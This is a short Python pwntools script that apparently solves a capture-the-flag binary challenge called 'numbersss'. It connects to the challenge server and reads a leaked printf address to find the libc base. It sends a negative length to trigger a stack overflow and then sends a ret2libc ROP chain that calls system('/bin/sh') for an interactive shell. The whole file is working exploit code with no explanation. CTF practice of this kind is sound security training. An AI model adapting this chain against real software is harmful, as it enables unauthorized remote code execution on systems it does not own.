import pwn

#p = pwn.process("./numbersss")
p = pwn.remote("numbersss.chal.cyberjousting.com" ,1351)

printf = int(p.recvline().split(b' ')[2][:-1],16 )
base = printf - 0x55ef0
system = base + 0x4ebf0
binsh = base + 0x1b51d2
pop_rdi = base + 0x240e5
ret =  base + 0x0000000000023159

p.sendlineafter( b'read in?',b'-10')


chain = 0x18 * b'A' + pwn.p64(pop_rdi) + pwn.p64(binsh) + pwn.p64(ret) + pwn.p64(system)


chain += (0xf6 - len(chain)-2) * b'A'
p.sendline(chain)
p.interactive()
